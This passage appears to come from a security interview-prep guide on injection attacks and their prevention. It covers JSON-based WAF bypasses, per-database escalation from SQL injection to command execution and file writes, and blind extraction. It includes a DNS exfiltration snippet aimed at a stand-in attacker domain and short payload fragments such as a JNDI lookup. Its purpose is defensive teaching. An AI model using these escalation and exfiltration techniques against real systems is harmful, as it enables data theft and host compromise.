## Modern WAF bypasses: JSON-based SQLi

A WAF is a bypassable blocklist (see the WAF section), and the **JSON-based SQLi bypass
(Claroty Team82, 2022)** is the canonical modern proof. Databases (MySQL, PostgreSQL, MSSQL,
SQLite) added native **JSON operators** — `->`, `->>`, `@>`, `<@`, `?`, `JSON_EXTRACT`,
`::jsonb` — but the signature engines of major WAFs (Palo Alto, F5 BIG-IP, AWS ELB/WAF,
Cloudflare, Imperva) did not recognize JSON syntax as part of a SQL statement. Prepending a
JSON operator to an otherwise-detected payload caused the WAF to **fail to parse it as SQL**
and let it through, while the database still executed it.

The lesson for interviews: this is *the* answer to **"we added a WAF and it caught our SQLi
test — are we safe?"** No — signature engines lag behind database syntax (JSON operators,
plus classic encoding/case/comment/whitespace tricks), and a WAF still cannot see
second-order or non-HTTP injection paths. Fix the code.

---

## SQLi-to-RCE escalation and per-database hardening

Whether a SQL injection stays "just the rows" or becomes **full host RCE** depends on the DB
account's privileges and enabled features — which is why least privilege is load-bearing
defense in depth. Per-engine escalation primitives to disable/lock down:

- **MySQL/MariaDB:** `FILE` privilege enables `LOAD_FILE()` (read files) and `INTO OUTFILE`
  (write files, e.g. a web shell). Constrain with `secure_file_priv` and do not grant `FILE`.
- **MS SQL Server:** `xp_cmdshell` (OS command execution) and `OPENROWSET`/`OPENQUERY`
  (file/remote access). Keep `xp_cmdshell` disabled; run the app as a low-privilege login,
  not `sa`.
- **PostgreSQL:** `COPY ... FROM/TO PROGRAM` (runs OS commands), untrusted PL languages, and
  superuser capabilities. The app role must be non-superuser and lack `COPY PROGRAM` rights.
- **MongoDB:** server-side JavaScript (`$where`, `mapReduce`) — disable with
  `security.javascriptEnabled: false` (or `--noscripting`).

Least privilege converts a `SELECT`-context injection from "read/write files and run OS
commands" into "read the rows this account could already read" — the difference between a
breach and an incident.

---

## Efficient blind extraction and OAST

Blind extraction (boolean/time-based) is slow if done naively (compare each character to 256
possibilities), so attackers and tools optimize:

- **Binary search / bit extraction.** Per character, binary-search the value range (`> 'm'`?
  `> 't'`?) — ~7-8 requests per ASCII character instead of dozens — or extract bit-by-bit
  with bitwise operators.
- **OAST / out-of-band (the preferred path when fully blind).** PortSwigger frames
  **OAST (out-of-band application security testing)** via DNS as the go-to for fully-blind
  injection and for **bulk data exfiltration**: force the DB to make a DNS lookup encoding
  data in the subdomain (`(SELECT ...)||.attacker-collab.net`). DNS frequently escapes even
  when HTTP egress is firewalled, and it exfiltrates whole values per request rather than one
  bit at a time.
- **Prefer error-based** if verbose errors leak — it returns data directly and is fastest of
  all.

The takeaway is unchanged: because extraction is fully automatable and fast, **hiding output
is never a defense** — only preventing the injection is.

---

## Common follow-up questions

- **"What is the single best defense against SQL injection?"** Parameterized queries /
  prepared statements — they separate query structure from data so bound values can never
  be parsed as SQL. Escaping and WAFs are secondary.
- **"Why isn't escaping enough?"** Numeric/unquoted contexts, charset/encoding bypasses,
  and the need to escape perfectly for every DB and context; one miss reopens the hole.
  Blocklists are additionally bypassable and break valid data.
- **"Can you parameterize a table or column name?"** No — placeholders bind *values*, not
  identifiers or SQL keywords. Use a strict allowlist mapping for dynamic identifiers.
- **"What is second-order SQLi?"** A stored malicious value that is safely stored, then
  later concatenated into a query in a different code path where it fires. Fix: treat data
  from your own DB as untrusted and parameterize *every* query.
- **"How do you detect SQLi when there's no error and no visible output?"** Boolean-based
  (compare true/false page states) and time-based blind (conditional `SLEEP`/`pg_sleep`/
  `WAITFOR` and measure latency), or out-of-band via DNS/HTTP.
- **"How is NoSQL injection different?"** You inject **operators/objects** (`$ne`, `$gt`,
  `$where`) instead of breaking a quoted string. Fix by enforcing input types (reject
  objects where a string is expected) and not passing raw user objects as query documents.
- **"How do you safely run an OS command with user input?"** Avoid the shell; use an
  **argv array** so input is a single argument. Then also guard **argument injection**
  (values starting with `-`) via allowlisting and `--` end-of-options.
- **"Are stored procedures safe?"** Only if they don't build dynamic SQL by concatenation
  from their parameters. Dynamic SQL inside a proc is still injectable.
- **"Is a WAF a valid SQLi defense?"** No — it's a bypassable, context-blind blocklist;
  use it only as defense in depth / virtual patching, never as the primary control.
- **"Why still use least-privilege DB accounts if you parameterize?"** Defense in depth —
  it bounds the damage of any injection that slips through (no DDL, no OS commands, limited
  tables).
- **"How do you safely pass an `IN` list of user-supplied IDs?"** Generate N `?` placeholders
  from a validated count (`IN (?,?,?)`) and bind N values — never bind a CSV string to one
  placeholder, and never bind an array to one `?`.
- **"We added a WAF and it caught our SQLi test — are we safe?"** No. Signature engines are
  bypassable (JSON operators per Claroty Team82 2022, plus encoding/case/comment tricks) and
  cannot see second-order or non-HTTP injection. Fix the code.
- **"What class of injection was Log4Shell, and what actually fixes it?"** JNDI/lookup
  interpolation injection (CVE-2021-44228) — untrusted logged strings interpreted for
  `${jndi:...}` lookups. Fix: upgrade Log4j (2.17.1+); `formatMsgNoLookups` was only partial.
- **"What was the Equifax injection?"** CVE-2017-5638 — Apache Struts 2 evaluated the
  `Content-Type` header as an OGNL expression, an expression-language injection (CWE-917)
  giving RCE.
- **"Is `{{7*7}}` returning 49 XSS or SSTI?"** SSTI — it was evaluated **server-side**
  (RCE-capable). If the payload only executes in the browser, that's XSS.
- **"How is `escapeshellcmd` different from `escapeshellarg`?"** `escapeshellcmd` still lets
  input add an extra argument (argument injection); `escapeshellarg` quotes to a single
  argument. Prefer an argv array with no shell.

## References

- OWASP Top 10 2021 — **A03:2021 Injection**: https://owasp.org/Top10/A03_2021-Injection/
- OWASP Cheat Sheet — **SQL Injection Prevention**:
  https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- OWASP Cheat Sheet — **Query Parameterization**:
  https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html
- OWASP Cheat Sheet — **Injection Prevention**:
  https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
- OWASP Cheat Sheet — **OS Command Injection Defense**:
  https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
- OWASP Cheat Sheet — **LDAP Injection Prevention**:
  https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html
- OWASP WSTG — **Testing for SQL / NoSQL / Command / LDAP / XPath Injection**:
  https://owasp.org/www-project-web-security-testing-guide/
- OWASP — **Testing for NoSQL Injection**:
  https://owasp.org/www-community/attacks/NoSQL_injection
- OWASP ASVS v4 — **V5 Validation, Sanitization and Encoding**:
  https://owasp.org/www-project-application-security-verification-standard/
- CWE-89 (SQL Injection): https://cwe.mitre.org/data/definitions/89.html
- CWE-78 (OS Command Injection): https://cwe.mitre.org/data/definitions/78.html
- CWE-943 (Improper Neutralization in a Data Query — NoSQL): https://cwe.mitre.org/data/definitions/943.html
- CWE-90 (LDAP Injection): https://cwe.mitre.org/data/definitions/90.html
- CWE-643 (XPath Injection): https://cwe.mitre.org/data/definitions/643.html
- RFC 4515 (LDAP String Representation of Search Filters): https://www.rfc-editor.org/rfc/rfc4515
- RFC 4514 (LDAP String Representation of Distinguished Names): https://www.rfc-editor.org/rfc/rfc4514
- CWE-611 (Improper Restriction of XML External Entity Reference): https://cwe.mitre.org/data/definitions/611.html
- CWE-94 / CWE-1336 (Code Injection / Server-Side Template Injection): https://cwe.mitre.org/data/definitions/1336.html
- CWE-917 (Expression Language Injection): https://cwe.mitre.org/data/definitions/917.html
- CWE-117 (Improper Output Neutralization for Logs): https://cwe.mitre.org/data/definitions/117.html
- CWE-93 / CWE-113 (CRLF Injection / HTTP Response Splitting): https://cwe.mitre.org/data/definitions/113.html
- OWASP Cheat Sheet — **XML External Entity Prevention**:
  https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- OWASP Cheat Sheet — **Injection Prevention (Template/EL)** & WSTG SSTI:
  https://owasp.org/www-project-web-security-testing-guide/
- CVE-2021-44228 / -45046 / -45105 (Log4Shell): https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- CVE-2017-5638 (Apache Struts 2 OGNL / Equifax): https://nvd.nist.gov/vuln/detail/CVE-2017-5638
- Claroty Team82 — **JSON-based SQL injection WAF bypass (2022)**:
  https://claroty.com/team82/research/js-on-security-off-abusing-json-based-sql-to-bypass-waf
- PortSwigger Web Security Academy — **SQL / NoSQL / OS command / SSTI injection**:
  https://portswigger.net/web-security
